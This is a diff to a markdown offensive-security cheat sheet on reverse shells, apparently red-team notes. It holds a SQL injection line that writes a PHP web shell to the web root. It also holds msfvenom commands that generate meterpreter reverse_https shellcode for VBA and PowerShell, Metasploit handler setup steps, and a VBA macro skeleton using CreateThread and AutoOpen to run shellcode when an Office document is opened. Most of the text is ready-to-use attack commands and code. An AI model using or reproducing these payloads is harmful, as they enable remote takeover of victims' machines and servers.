@@ -73,8 +73,14 @@ $sm.Write($st,0,$st.Length)}
 `select "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE "<php DOCUMENT_ROOT>/webshell.php"` then u can access the webshell by going `http://<url>/webshell.php?c=whoami`
 
 ## VBA reverse shell
+
+User has to press 'Enable Content'
+
+### pure bytes in VBA
+<details>
 1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f vbapplication`
-2. put this in your office document
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. put this in your office document (make sure its saved as a Word 97-2003 document)
 ```
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
@@ -109,5 +115,14 @@ Sub AutoOpen()
     MyMacro
 End Sub
 ```
+</details>
+
+## .ps1 reverse shell
+<details>
+1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
+2. put this in your office document
+</details>
+```
+
 
 Credit: [Invicti](https://www.invicti.com/learn/reverse-shell)
